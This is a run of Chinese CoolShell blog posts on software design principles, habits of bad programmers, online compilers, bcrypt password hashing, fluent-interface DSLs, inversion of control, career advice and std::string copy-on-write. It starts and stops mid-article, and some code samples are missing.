无环依赖原则（ADP）为我们解决包之间的关系耦合问题。在设计模块时，不能有循环依赖。**参考** ：#### 后记上面这些原则可能有些学院派，也可能太为理论，我在这里说的也比较模糊和简单，这里只是给大家一个概貌，如果想要了解更多的东西，大家可以多google一下。不过这些原则看上去都不难，但是要用好却并不那么容易。要能把这些原则用得好用得精，而不教条，我的经验如下：（我以为这是一个理论到应用的过程）1. 你可以先粗浅或是表面地知道这些原则。   2. 但不要急着马上就使用。   3. 在工作学习中观察和总结别人或自己的设计。   4. 再回过头来了回顾一下这些原则，相信你会有一些自己的心得。   5. 有适度地去实践一下。   6. Goto第 3步。我相信可能还会有其实一些原则，欢迎大家提供。（全文完）# 中国仍然是一个很穷的国家作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnGoogle最近发布了一个全世界可以开放查询的数据平台，其中包含了多种宏观数据，并且有很方便的作图方式。http://www.google.com/publicdata/directory
其中有一项是世界各国人均GDP虽然最近一些中国城市房价已经超越我们的想象力，但是从这张图里还是可以看到，我们仍是一个人均非常穷的国家。# 十个让你变成糟糕的程序员的行为作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn之前本站发表过《优秀程序员的十个习惯》以及《程序员需要具备的基本技能》，那是我们需要去学习和培养的。这里，我们主要讨论十个糟糕程序员的特征，主要是需要让我们去避免和小心的。**1) 情绪化的思维**如果你开始使用不同颜色的眼光来看待这个世界的话，那么你可能会成为一个很糟糕的程序员。情绪化的思维或态度很有可能会把自己变成一个怪物。相信你经常可以看到很多很糟糕的程序会使用下面的这些语句：* 我的程序不可能有这种问题。   * Java就是shit。   * 我最恨的就是使用UML做设计。   * 需求怎么老在变，没办干了。   * 受不了这些人，他们到底懂不懂啊。   * …… ……这些带着情绪化的思维和态度，不但可以让你成为一个很糟糕的程序员，甚至可以影响你的前途。因为，情绪化通常都是魔鬼，会让你做出错误的判断和决定，错误码率的判断和决定直接决定了你的人生。
**2) 怀疑别人**糟糕的程序总是说：“我的代码一定是正确的，我怀疑编译器有问题”，“我这应该没有问题吧，STL库怎么这么难用啊”。我曾经见过有程序员这样使用STL类：map<char*, char*>，当他发现这样放入字符串后却取不出来，觉得那是STL库的BUG，然后自己写了一个map！我的天啊！某些时候，过早的下结论是一个很不好的习惯，任何事情都有其原因，只有知道了原因，你才能知道是谁的问题。一般来说，总是自己出的问题。**3) 过多关注实现，陷入问题细节**有些时候，当我们面对一个问题或是一个需求的时候，糟糕的程序员总是会马上去找一个解决方案或是实现，这是一个很不好的习惯。设计模式告诉我们，“喜欢接口，而不是实现”就是告诉我们，认清问题的本质和特性要比如何实现更重要。* 对于一个客户的问题来说，首先应该想到的是如何先让用户正常工作，如何恢复正在“流血”的系统，而不是把用户放在一边而去分析问题的原因和解决方案。   * 对于解决一个bug来说，重现bug，了解原来程序的意图是首先重要的事，而不是马上去修改代码，否则必然会引入更多的BUG。   * 对于一个需求来说，我们需要了解的需求后面的商业背景，use case和真实意图，而不是去讨论如何实现。只有了解了用户的真实意图，实际使用的方式和案例，你才能真正如果去做设计。
糟糕的程序总是容易陷入细节，争论于如何实现和实现难题，以及问题的根本原因，而忽略了比这些更重要的东西。只有看懂了整个地图，我们才知道要怎么去走。**4) 使用并不熟悉的代码**糟糕的程序员最好的朋友是 Ctrl-C 和 Ctrl-V ，有些时候，他们并不知道代码的确切含义，就开始使用它，有证据表明，由拷贝粘贴引发的bug占了绝大多数。因为，代码总是只能在特定的环境下才能正常地工作，如果代码的上下文改变了，很有可能使得代码产生很多你不知道的行为，当你连代码都控制不住了，你还能编出什么好的程序呢？**5) 拼命工作而不是聪明的工作**对于糟糕的程序员，我们总是能看到他们拼命地修正他们的bug，总是花非常多时间并重复地完成某一工作。而好的程序可能会花双倍的时间来准备一个有效的开发环境，工具，以及在开发的时候花双倍甚至10倍的时间来避免一些错误。好的程序员总是会利用一切工具或手段来让自己的工作变得更有效率，总是为在开发的时候尽可能得不出错。后期出错的成本将会是巨大的，而且那时改正错误的压力也是巨大的。所以，糟糕的程序通常会让自己进入一种恶性循环，他们看上去总是疲惫的，总是很辛苦的，所以更没有时间来改善，越没有时间来改善，就有越多的问题。所以，拼命工作有些时候可能表明你不是一个好的程序员。
**6) 总是在等待、找借口以及抱怨**当需求不明确的时候，当环境不是很满意的时候，他们总是在等待别人的改善。出现问题的时候，总是在找借口，或是抱怨这也不好，那也不好，所以自己当然就没有做好。糟糕的程序员总是希望自己的所处的环境是最好的，有明确的需求，有非常不错的开发环境，有足够的时间，有不错的QA，还有很强的team leader，以及体贴自己的经理，有足够的培训，有良好的讨论，有别人强有力的支持……，这是一种“饭来张口，衣来伸手”的态度，这个世界本来就不完美，一个团队需要所有人去奋斗，况且，如果什么都变得完美了，那么，你的价值何在吗？driving instead of waiting, leading instead of following.**7) 滋生办公室政治**有句话叫“丑女多作怪”，意思是说如果一个自己没有真实的能力的话，那么他一定会在其它方面作文章。糟糕的程序员也是这样，如果他们程序编不好的话，比不过别人的话，他们通常会去靠指责别人，推脱责任，或是排挤有能力的人，等等不正常的手段来保全自己。所以，糟糕的程序通常伴随着办公室政治。**8 ) 说得多做得少**糟糕的程序员总是觉得自己什么都懂，他们并不会觉得自己的认识和知识都是有限的。这就是所谓的夸夸其谈，是的，什么都做不好的程序员能靠什么混日子呢？就是吹啊吹啊。
另一个表现方式是他们在评论起别人的程序或是设计，总是能挑出一堆毛病，但自己的程序写得也很烂。总是批评抱怨，而没有任何有建设性的意见，或是提出可行的解决方案。这些糟糕的程序员，总是喜欢以批评别人的程序而达到显示自己的优秀。**9) 顽固**当你给出一打证据说明那里有一个更好的方案，那里有一个更好的方向的时候，他们总是会倔强的认为他们自己的做法才是最好的。一个我亲身经历的事例就是，当我看到一个新来的程序员在解决一个问题的时候走到了错误的方向上时，我提醒他，你可能走错了，应该是另外那边，并且我证明了给他看还有一个更为简单的方法，有。然而，这位程序员却告诉我，“那是我的方法，我一定要把之走下去，不然我会非常难受”，于是，在三天后的代码评审中，在经过顽固地解释以及一片质疑声中，他不得不采用了我最先告诉他的那个方法。这些程序员，从来不会去想，也不会去找人讨论还有没有更好的方法，而是坚持自己的想法，那怕是条死路都一往直前，不撞南墙永不回头。**10) 写“聪明”的代码**他们写出来的代码需要别的同事查看程序语言参考手册，或是其程序的逻辑或是风格看上去相当时髦，但却非常难读。代码本应该简洁和易读，而他们喜欢在代码中表现自己，并尝试另类的东西，以显示自己的才气。是的，只有能力有问题的程序员才需要借助这样的显示。
记得以前的一个经历，一位英语很不错的程序员加入公司，本来对我们这些英语二把刀来说，我们喜欢看到的是简单和易读的英文文档，然后，那位老兄为了展示他的英语如何牛，使用了很多GRE中比较生僻的短语和词汇。让大家阅读得很艰苦。最有讽刺意味的是，有一位native的美国人后来在其邮件中询问他某个单词的意思。呵呵。你是一个糟糕的程序员吗？欢迎你分享你的经历。（全文完）# 在线代码编译服务Codepad.org作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnCodepad.org是一个很有意思的网站，它的主页很简单，左边是可以编译并执行的程序语言，右边则是让你输入程序的输入框，输入框的下面是一个“Run Code”的复选钮和一个“Submit”的提交按钮。其操作起来也非常简单，先选中你要编译并运行的程序语言，然后在输入框中粘贴或输入程序的原代码，然后，点击提交，你就可以看么你程序编译出错的提示，或是执行的结果。也许，你会觉得很无聊天，但我觉得这在某些时候会非常有用，尤其是你找不到编译器而又想验证一段代码的时候，这种时候还是比较多的。特别是我们很难有一台可以运行所有语言的电脑，如果有的话，那一定是你自己的个人电脑，当你不使用你自己的电脑时，你就会着急了。而且，我觉得这项服务非常地有意思，因为，这样一来，你甚至可以在你的手机上写任何语言的程序了。
目前这个网站支持下面这样语言——C，C++，D，Haskell，Lua，OCaml，PHP，Perl，Plain Text，Python，Ruby，Scheme，Tcl。（没有Java）当我打开这个网页的时候，我立马想到了《6个变态的C语言Hello World程序》，然后就取了其中一个上去试了一下，果然方便啊。的确是相当的省事啊，不需要打开编译器或IDE，不需要建工程，不需要存成文件，太方便了。!codepad.org执行BT的hello world。(全文完)# 一个人脸识别的Javascript作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这里有一个人脸识别的Javascript，感觉挺酷的。识别的还是很不错的，网友们在做了很多的测试，对于动画片里的人员很不准，而且，照片质量要好一点的会准一点。下面是一些识别结果：一个递归式的图不过，好像只能识别白人大家可以去试试。# 如何防范密码被破解作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn你会用什么样的算法来为你的用户保存密码？如果你还在用明码的话，那么一旦你的网站被hack了，那么你所有的用户口令都会被泄露了，这意味着，你的系统或是网站就此完蛋了。所以，我们需要通过一些不可逆的算法来保存用户的密码。比如：MD5, SHA1, SHA256, SHA512, SHA-3,等Hash算法。这些算法都是不可逆的。系统在验证用户的口令时，需要把Hash加密过后的口令与后面存放口令的数据库中的口令做比较，如果一致才算验证通过。
但你觉得这些算法好吗？我说的是：MD5, SHA1, SHA256, SHA512, SHA-3。如果你使用的是MD5算法来加密你的口令，如果你的口令长度只有小写字母再加上数字，假设口令的长度是6位，那么在目前一台比较新一点的PC机上，穷举所有的口令只需要40秒钟。而据我们了解，几乎有90%以上的用户只用小写字母和数字来组织其口令。对于6位长度的密码只需要最多40秒就可以破解了，这可能会吓到你。如果你愿意花2000美金和一周的时间来构建一个CUDA，那么，你可以在你组建的这个集群中使用进行密码穷举运算，其速度是，1秒钟可以计算7亿个口令。对于目前实际当中使用的比较复杂的口令，其破解率也可以高达每秒一个。当然，这里说的算法是MD5，SHA之类的算法。那么，对于这样的一种情况来说，我们怎么办？我们还是有办法的。我们知道MD5，SHA的算法速度太快了。所以，我们需要一个“慢一点”的加密算法。呵呵。bcrypt是这样的一个算法，因为它很慢，对于计算机来说，其慢得有点BT了，但却慢得刚刚好！对于验证用户口令来说是不慢的，对于穷举用户口令来说，其会让那些计算机变得如同蜗牛一样。因为bcrypt采用了一系列各种不同的Blowfish加密算法，并引入了一个work factor，这个工作因子可以让你决定这个算法的代价有多大。因为这些，这个算法不会因为计算机CPU处理速度变快了，而导致算法的时间会缩短了。因为，你可以增加work factor来把其性能降下来。呵呵。
那么，bcrypt到底有多慢？如果和MD5一起来比较的话，如果使用值为12的work factor的话，如果加密“cool”的话，bcrypt需要0.3秒，而MD5只需要一微秒（百万分之一秒）。也就是说，前面我们说的那个只需要40秒就可以穷举完所有的可能的MD5编码的口令的算法，在使用bcrypt下，需要12年。这就是bcrypt给你带来的选择， **你可以一个安全的口令和一个快速的加密算法，或是一个不怎么安全的口令和一个性能不好的加密算法** 。# API设计：用流畅接口构造内部DSL作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**感谢@weidagang （Todd）向酷壳投递本文。**程序设计语言的抽象机制包含了两个最基本的方面：一是语言关注的基本元素/语义；另一个是从基本元素/语义到复合元素/语义的构造规则。在C、C++、Java、C#、Python等通用语言中，语言的基本元素/语义往往离问题域较远，通过API库的形式进行层层抽象是降低问题难度最常用的方法。比如，在C语言中最常见的方式是提供函数库来封装复杂逻辑，方便外部调用。不过普通的API设计方法存在一种天然的陷阱，那就是不管怎样封装，大过程虽然比小过程抽象层次更高，但本质上还是过程，受到过程语义的制约。也就是说，通过基本元素/语义构造更高级抽象元素/语义的时候，语言的构造规则很大程度上限制了抽象的维度，我们很难跳出这个维度去，甚至可能根本意识不到这个限制。而SQL、HTML、CSS、make等DSL（领域特定语言）的抽象维度是为特定领域量身定做的，从这些抽象角度看问题往往最为简单，所以DSL在解决其特定领域的问题时比通用程序设计语言更加方便。通常，SQL等非通用语言被称为外部DSL（External DSL）；在通用语言中，我们其实也可以在一定程度上突破语言构造规则的抽象维度限制，定义内部DSL（Internal DSL）。
本文将介绍一种被称为流畅接口（Fluent Interface）的内部DSL设计方法。Wikipedia上Fluent Interface的定义是：> A fluent interface (as first coined by Eric Evans and Martin Fowler) is an > implementation of an object oriented API that aims to provide for more > readable code. A fluent interface is normally implemented by using method > chaining to relay the instruction context of a subsequent call (but a fluent > interface entails more than just method chaining).下面将分4个部分来逐步说明流畅接口在构造内部DSL中的典型应用。目录* 1\. 基本语义抽象   * 2\. 管道抽象   * 3\. 层次结构抽象   * 4\. 异步抽象
#### **1\. 基本语义抽象**如果要输出0..4这5个数，我们一般会首先想到类似这样的代码：而Ruby虽然也支持类似的for循环，但最简单的是下面这样的实现：Ruby中一切皆对象，5是Fixnum类的实例，times是Fixnum的一个方法，它接受一个block参数。相比for循环实现，Ruby的times方式更简洁，可读性更强，但熟悉OOP的朋友可能会有疑问，times是否应该作为整型类的方法呢？在OOP中，方法调用通常代表了向对象发送消息，改变或查询对象的状态，times方法显然不是对整型对象状态的查询和修改。如果你是Ruby的设计者，你会把times方法放入Fixnum类吗？如果答案是否定的，那么Ruby的这种设计本质上代表了什么呢？实际上，这里的times虽然只是一个普通的类方法，但它的目的却与普通意义上的类方法不同，它的语义实际上类似于for循环这样的语言基本语义，可以被视为一种自定义的基本语义。times的语义从一定程度上跳出了类方法的框框，向问题域迈进了一步！另一个例子来自Eric Evans的“用两个时间点构造一个时间段对象”，普通设计：//Java     TimePoint fiveOClock, sixOClock;     TimeInterval meetingTime = new TimeInterval(fiveOClock, sixOClock);
另一种Evans的设计是这样：//Java     TimeInterval meetingTime = fiveOClock.until(sixOClock);按传统OO设计，until方法本不应出现在TimePoint类中，这里TimePoint类的until方法同样代表了一种自定义的基本语义，使得表达时间域的问题更加自然。虽然上面的两个简单例子和普通设计相比看不出太大的优势，但它却为我们理解流畅接口打下了基础。重要的是应该体会到它们从一定程度上跳出了语言基本抽象机制的束缚，我们不应该再用类职责划分、迪米特法则（Law of Demeter）等OO设计原则来看待它们。#### **2\. 管道抽象**在Shell中，我们可以通过管道将一系列的小命令组合在一起实现复杂的功能。管道中流动的是单一类型的文本流，计算过程就是从输入流到输出流的变换过程，每个命令是对文本流的一次变换作用，通过管道将作用叠加起来。在Shell中，很多时候我们只需要一句话就能完成log统计这样的中小规模问题。和其他抽象机制相比，管道的优美在于无嵌套。比如下面这段C程序，由于嵌套层次较深，不容易一下子理解清楚：//C     min(max(min(max(a,b),c),d),e)
而用管道来表达同样的功能则清晰得多：#!/bin/bash     max a b | min c | max d | min e我们很容易理解这段程序表达的意思是：先求a, b的最大值；再把结果和c取最小值；再把结果和d求最大值；再把结果和e求最小值。jQuery的链式调用设计也具有管道的风格，方法链上流动的是同一类型的jQuery对象，每一步方法调用是对对象的一次作用，整个方法链将各个方法的作用叠加起来。//Javascript     $('li').filter(':event').css('background-color', 'red');#### 3\. 层次结构抽象除了管道这种“线性”结构外，流畅接口还可用于构造层次结构抽象。比如，用Javascript动态创建创建下面的HTML片段：<div id="’product_123’" class="’product’">     <img src="’preview_123.jpg’" alt="" />     <ul>     <li>Name: iPad2 32G</li>     <li>Price: 3600</li>     </ul>     </div>
若采用Javascript的DOM API：//Javascript     var div = document.createElement('div');     div.setAttribute(‘id’, ‘product_123’);     div.setAttribute(‘class’, ‘product’);var img = document.createElement('img');     img.setAttribute(‘src’, ‘preview_123.jpg’);     div.appendChild(img);var ul = document.createElement('ul');     var li1 = document.createElement('li');     var txt1 = document.createTextNode("Name: iPad2 32G");     li1.appendChild(txt1);     …     div.appendChild(ul);而下面流畅接口API则要有表现力得多：//Javascript     var obj =     $.div({id:’product_123’, class:’product’})     .img({src:’preview_123.jpg’})     .ul()     .li().text(‘Name: iPad2 32G’)._li()     .li().text(‘Price: 3600’)._li()     ._ul()     ._div();
和Javascript的标准DOM API相比，上面的API设计不再局限于孤立地看待某一个方法，而是考虑了它们在解决问题时的组合使用，所以代码的表现形式特别贴近问题的本质。这样的代码是自解释的（self- explanatory）在可读性方面要明显胜于DOM API，这相当于定义了一种类似于HTML的内部DSL，它拥有自己的语义和语法。需要特别注意的是，上面的层次结构抽象和管道抽象有着本质的不同，管道抽象的方法链上通常是同一对象的连续传递，而层次抽象中方法链上的对象却在随着层次的变化而变化。此为，我们可以把业务规则也表达在流畅接口中，比如上面的例子中，body()不能包含在div()返回的对象中，div().body()将抛出”body方法不存在”异常。#### **4\. 异步抽象**流畅接口不仅可以构造复杂的层次抽象，还可以用于构造异步抽象。在基于回调机制的异步模式中，多个异步调用的同步和嵌套问题是使用异步的难点所在。有时一个稍复杂的调用和同步关系会导致代码充满了复杂的同步检查和层层回调，难以理解和维护。这个问题从本质上讲和上面HTML的例子一样，是由于多数通用语言并未把异步作为基本元素/语义，许多异步实现模式是向语言的妥协。针对这个问题，我用Javascript编写了一个基于流畅接口的异步DSL，示例代码如下：
[javascript]   //Javascript   $.begin()   .async(newTask(‘task1’), ‘task1’)   .async(newTask(‘task2’), ‘task2’)   .async(newTask(‘task3’), ‘task3’)   .when()   .each_done(function(name, result) {   console.log(name + ‘: ‘ + result);})   .all_done(function(){ console.log(‘good, all completed’); })   .timeout(function(){   console.log(‘timeout!!’);   $.begin()   .async(newTask(‘task4’), ‘task4’)   .when()   .each_done(function(name, result) {   console.log(name + ‘: ‘ + result); })   .end();}   , 3000)   .end();[/javascript]
上面的代码只是一句Javascript调用，但从另一个角度看它却像一段描述异步调用的DSL程序。它通过流畅接口定义了begin when end的语法结构，begin后面跟的是启动异步调用的代码；when后面是异步结果处理，可以选择each_done, all_done, timeout中的一种或多种。而begin when end结构本身是可以嵌套的，比如上面的代码在timeout处理分支中就包含了另一个begin when end结构。通过这个DSL，我们可以比基于回调的方式更好地表达异步调用的同步和嵌套关系。上面介绍了用流畅接口构造的4种典型抽象，出此之外还有很多其他的抽象和应用场合，比如：不少单元测试框架就通过流畅接口定义了单元测试的DSL。虽然上面的例子以Javascript等动态语言居多，但其实流畅接口所依赖的语法基础并不苛刻，即使在Java这样的静态语言中，同样可以轻松地使用。流畅接口不同于传统的API设计，理解和使用流畅接口关键是要突破语言抽象机制带来的定势思维，根据问题域选取适当的抽象维度，利用语言的基本语法构造领域特定的语义和语法。**参考*** Wikipedia: Fluent Interface   * Martin Fowler: Fluent Interface   * jQuery is DSL   * An Approach to Internal Domain-Specific Languages in Java
# 需求变化与IoC作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【感谢 Todd投递本文 – 微博帐号：@weidagang 】#### 需求又变了，怎么办？先上一个轻松的段子：> > 程序员XX遭遇车祸成植物人，医生说活下来的希望只有万分之一，唤醒更为渺茫。可他的Lead和亲人没有放弃，他们根据XX工作如命的作风，每天都在他身边念：“XX，需求又改了，该干活了，你快来呀！”，奇迹终于发生了，XX醒来了，第一句话：“需求又改了？”。这个段子用幽默的方式反映了需求变化是每一个程序员、架构师或项目经理都会经常遇到的问题。面对这个问题，不同的人有不同的应对之道，最近微博上有一段关于需求变化的讨论：> > @假装刺猬的猪：我们在软件开发过程中，会持续碰到客户需求变更的情况。如果没有领域建模，我们单纯将问题使用直觉将问题解决，那么等到客户需求变更或者有新的需求时，就会面临一个僵硬的前设计！无法在以前的设计上持续深入的优化模型，导致需求变更无法及时深化。设计实现均滞后与变更！ > > @高煥堂: <碰到客户需求变更的情况>是合理的；但<领域建模>不是美好的手段!!! > > @weidagang: 要不被客户牵着鼻子走，需要自己有很强的设计能力， **反过来** > 让客户跟着你的设计来满足你的要求。能做到这点的公司很少，但这是软件行业唯一有希望的出路。 > > @高煥堂: <这是软件行业唯一有希望的出路>。 Great!!
如何应对需求变化？ @假装刺猬的猪 的答案是领域建模，并持续优化模型，适应需求的变化。@高煥堂 则认为领域建模不是美好的手段。我进一步补充，应该 **“反过来”** 让自己在需求变化中处于主导地位，而不是被动地适应。#### 控制反转 (IoC)什么样就算是“反过来”了呢？举个例子：> > 用户想购买一台普通PC，他只想电脑能流畅运行魔兽世界，他根本不想知道什么叫主板，什么叫内存，什么叫CPU；但他不得不接受必须购买主板、CPU、内存的事实，因为PC架构是产业标准，而不是由用户定的。客户有选择的权利，但没有设计的权利，客户的需求必须在设计框架下得到满足。这里我们要问PC架构是保护了谁的利益？显然，直接的受益者是厂商。如果没有PC架构的保护，厂商就会直接面对客户，客户说我需要功能A，我马上分析设计实现功能A；客户说我要功能B，我马上分析设计实现功能B … 有了PC架构的保护，厂商就变得更加强势，用户的一切需求都必须在PC架构下来谈。厂商可以倾听用户的声音，不断改进产品，但设计主导权永远在自己手中。我们IT行业常常用“做产品”和“做项目”的视角来区分不同的公司，但很少有人用“做设计”的视角来看。实际上，关键的问题在于设计主导权是厂商还是在客户。如果设计主导权在客户，不管是做产品、做服务还是做项目，其命运必然是疲于奔命应付客户，最后获得微薄的利润；如果设计主导权在厂商，不管做产品、做服务还是做项目都能有更多的话语权和更高的利润。
当然，光有设计还不够，必须客户接受才能起到通过设计掌握主导权的作用。这一方面需要自己具有很强的设计能力，如苹果就是以设计能力著称的公司；另一方面，和其他厂商结盟壮大阵营也是一种方法，如最著名的Wintel联盟(Windows+Intel)，以及现在的日益壮大的Android阵营都属于此类。假如有厂商不遵守PC产业标准，说我的PC就没有主板，没有显卡，因为用户更不不需要这些东西；那么，它要么像苹果一样独树一帜成为一种新的标准，要么无人问津。我所谈到的“反过来”本质上就是软件设计中的控制反转 (Inversion of Control, IoC)思想。IoC是每一个初级程序员向高级进阶所需要了解的 **最重要** 的设计思想。由于Spring等开发框架的流行，知道IoC概念的程序员不在少数，但不少人对于IoC的理解仅仅停留在通过依赖注入 (Dependency Injection)实现解耦这个层面。实际上，IoC的应用不仅包括解耦，它还是框架的基本原理，在非计算机领域，IoC也是无处不在，如果你能从上面的例子中体会到IoC，这才算是融会贯通了。软件开发中一种最常见的模式是“以用户为出发点，以需求分析为核心”。该模式提倡从用户需求中分析推导出设计和实现，比如，TDD式的设计正是这类典型。而IoC式的软件设计与此截然相反，IoC的设计是一种“以愿景（自身利益是愿景的重要方面）为出发点，以架构为核心”的模式。如果用户的需求是一台电脑，我们如何能通过第一种模式分析需求推导出“主板- CPU-内存- 外设”的PC架构呢？恐怕很难。IoC式的设计是以用户看不见摸不着的架构为核心，自己主导设计，用户需求是设计的约束条件和验证手段，而不是出发点和目标。我们想要掌握主动，不被需求变化搞得疲于奔命，就必须熟练使用第二种模式。
我们的人生都被环境和各种客观条件所束缚，多数人只能随波逐流，听从命运的安排。你有没有想过要拥有人生的主导权呢？既然你是程序员，你懂IoC，你能否设计自己的人生框架呢？Yes，you can!# 你和你的工作作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn源文：，有人说下面的这个文章太过Crazy，有人说下面的这个文章是猎头的软文，你换工作换得越多，他们才能越挣钱。我的观点的，先别否定他的观点，试着去理解一下为什么他要这么说，你会发现还有一些道理的。然后，想一想，自己需要的是什么？一份工作？还是一份经历？还是不断的自我挑战？相信你会有知道该怎么去做的。当然，“离职”是最后一步棋，在此前，我更希望你能尝试地在你现在工作环境下去改变去影响。> “The role of a manager should be to ensure that those that work for him/her > eventually leave and go onto bigger and better things” — Mark Plant如果你对你的工作不高兴——离开，如果每天早上你对你的工作没有激情——无论你在干什么你都要停下来。
因为这就是我们赖以生存的东西。1. 如果你的工作没有挑战性 – leave.   2. 如果你在混你的工作 – leave.   3. 如果你觉得现在不辛苦而又感到压力大 – leave.   4. 如果你完全知道你现在正在做的所有一切的事 – leave.   5. 如果你没有得到足够多的失败– leave 并到找一个地方可以让你获得成功前的失败。而当你发现你天天都在成功 – leave again.   6. 如果你觉得你很成功 – leave 然后去找某个事或某个地方你不会那么成功，而当你又觉得你又很成功了 – leave again.   7. 如果所有的人都喜欢你并喜欢和你一起工作 – leave 然后去某个地方，那里的人并不喜欢你（然后你让他们喜欢你）。   8. 如果你的工作就像是赢奖品一样，并且你总是能赢 – leave 然后找个地儿，那里的人总是赢不了什么。帮他们扭转局面。   9. 如果你认为你知道产品的所有的内在的东西 – leave 然后找一个你不知道的产品。10. 如果你认为你明白你所有影响力的价值所在，并觉得你已挑战过所有你可以找到的方面 – leave 然后找个地儿，在那里有不同的甚至你不了解的能影响你的人或事。   11. 如果你的经理不能影响你最终去成就更大更好的事情 – leave.   12. 如果有人妨碍你的进步（无论是内部的还是外部的） – leave.   13. 如果有人正试图让你呆在你的工作里不要改变 – leave.   14. 如果你的经理正试图让你留下，但他并不是一个好的经理 – leave.   15. 如果日子过得很顺，并且那里有太多的时候可以闲扯（或是你身边都是有太多时间闲扯的人）– leave.   16. 如果你没有和哪些和你一样在团队工作和协作方面投入相应的思考和精力的人一起工作 – leave 并去寻找这些人   17. 如果那里有这样一种文化——靠加钱来说服别人留下 – leave. （译注：这样的Culture必然造就不公平）   18. 如果那里有一种商业文化阻止人不能为竞争对手工作 – leave.（译注：《保密协议》里应该限制的是内容，而不是人身自由）   19. 如果你工作的那个地方有一个商业文化试图让竞争对手失败 – leave. （译注：人个理解竞争不是让对手失败，而是比对手做得更好）   20. 如果那里没有一种文化（或是一种理解），其可以帮助优秀的人和那些工作不是太好的人去创造好的工作关系，并让他们可以很好的工作在一起 – leave.   21. 如果那里的文化并不理解，良好工作关系间的紧密程度能够造就更好的产出 – leave.
我觉得作者所说的leave，应该是离开这个事，这个团队，而不完全是离开这个公司。我个人对上述的21条中的某些条觉得非常认同，比如：1，8，11，12，15，16，17。（全文完）# C++ STL string的Copy-On-Write技术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnScott Meyers在《More Effective C++》中举了个例子，不知你是否还记得？在你还在上学的时候，你的父母要你不要看电视，而去复习功课，于是你把自己关在房间里，做出一副正在复习功课的样子，其实你在干着别的诸如给班上的某位女生写情书之类的事，而一旦你的父母出来在你房间要检查你是否在复习时，你才真正捡起课本看书。这就是“拖延战术”，直到你非要做的时候才去做。当然，这种事情在现实生活中时往往会出事，但其在编程世界中摇身一变，就成为了最有用的技术，正如C++中的可以随处声明变量的特点一样，Scott Meyers推荐我们，在真正需要一个存储空间时才去声明变量（分配内存），这样会得到程序在运行时最小的内存花销。执行到那才会去做分配内存这种比较耗时的工作，这会给我们的程序在运行时有比较好的性能。必竟，20%的程序运行了80%的时间。
当然，拖延战术还并不只是这样一种类型，这种技术被我们广泛地应用着，特别是在操作系统当中，当一个程序运行结束时，操作系统并不会急着把其清除出内存，原因是有可能程序还会马上再运行一次（从磁盘把程序装入到内存是个很慢的过程），而只有当内存不够用了，才会把这些还驻留内存的程序清出。写时才拷贝（Copy-On- Write）技术，就是编程界“懒惰行为”——拖延战术的产物。举个例子，比如我们有个程序要写文件，不断地根据网络传来的数据写，如果每一次fwrite或是fprintf都要进行一个磁盘的I/O操作的话，都简直就是性能上巨大的损失，因此通常的做法是，每次写文件操作都写在特定大小的一块内存中（磁盘缓存），只有当我们关闭文件时，才写到磁盘上（这就是为什么如果文件不关闭，所写的东西会丢失的原因）。更有甚者是文件关闭时都不写磁盘，而一直等到关机或是内存不够时才写磁盘，Unix就是这样一个系统，如果非正常退出，那么数据就会丢失，文件就会损坏。呵呵，为了性能我们需要冒这样大的风险，还好我们的程序是不会忙得忘了还有一块数据需要写到磁盘上的，所以这种做法，还是很有必要的。目录* STL类std::string的Copy-On-Write   * 特性   * 深入   * Copy-On-Write的原理是什么？   * string类在什么情况下才共享内存的？   * string类在什么情况下触发写时才拷贝（Copy-On-Write）?   * Copy-On-Write时，发生了什么？   * Copy-On-Write的具体实现是怎么样的？   * 副作用   * 后记
#### STL类std::string的Copy-On-Write在我们经常使用的STL标准模板库中的string类，也是一个具有写时才拷贝技术的类。C++曾在性能问题上被广泛地质疑和指责过，为了提高性能，STL中的许多类都采用了Copy- On-Write技术。这种偷懒的行为的确使使用STL的程序有着比较高要性能。这里，我想从C++类或是设计模式的角度为各位揭开Copy-On-Write技术在string中实现的面纱，以供各位在用C++进行类库设计时做一点参考。在讲述这项技术之前，我想简单地说明一下string类内存分配的概念。通过常，string类中必有一个私有成员，其是一个char*，用户记录从堆上分配内存的地址，其在构造时分配内存，在析构时释放内存。因为是从堆上分配内存，所以string类在维护这块内存上是格外小心的，string类在返回这块内存地址时，只返回const char*，也就是只读的，如果你要写，你只能通过string提供的方法进行数据的改写。#### 特性由表及里，由感性到理性，我们先来看一看string类的Copy-On-Write的表面特征。让我们写下下面的一段程序：
printf ("Sharing the memory:/n");     printf ("/tstr1's address: %x/n", str1.c_str() );     printf ("/tstr2's address: %x/n", str2.c_str() );str1[1]='q';     str2[1]='w';printf ("After Copy-On-Write:/n");     printf ("/tstr1's address: %x/n", str1.c_str() );     printf ("/tstr2's address: %x/n", str2.c_str() );return 0;     }这个程序的意图就是让第二个string通过第一个string构造，然后打印出其存放数据的内存地址，然后分别修改str1和str2的内容，再查一下其存放内存的地址。程序的输出是这样的（我在VC6.0和g++ 2.95都得到了同样的结果）：> g++ -o stringTest stringTest.cpp     > ./stringTest     Sharing the memory:     str1's address: 343be9     str2's address: 343be9     After Copy-On-Write:     str1's address: 3407a9     str2's address: 343be9
从结果中我们可以看到，在开始的两个语句后，str1和str2存放数据的地址是一样的，而在修改内容后，str1的地址发生了变化，而str2的地址还是原来的。从这个例子，我们可以看到string类的Copy- On-Write技术。####  深入在深入这前，通过上述的演示，我们应该知道在string类中，要实现写时才拷贝，需要解决两个问题，一个是内存共享，一个是Copy-On- Wirte，这两个主题会让我们产生许多疑问，还是让我们带着这样几个问题来学习吧：1、 Copy-On-Write的原理是什么？2、 string类在什么情况下才共享内存的？3、 string类在什么情况下触发写时才拷贝（Copy-On-Write）?4、 Copy-On-Write时，发生了什么？5、 Copy-On-Write的具体实现是怎么样的？喔，你说只要看一看STL中stirng的源码你就可以找到答案了。当然，当然，我也是参考了string的父模板类basic_string的源码。但是，如果你感到看STL的源码就好像看机器码，并严重打击你对C++自信心，乃至产生了自己是否懂C++的疑问，如果你有这样的感觉，那么还是继续往下看我的这篇文章吧。
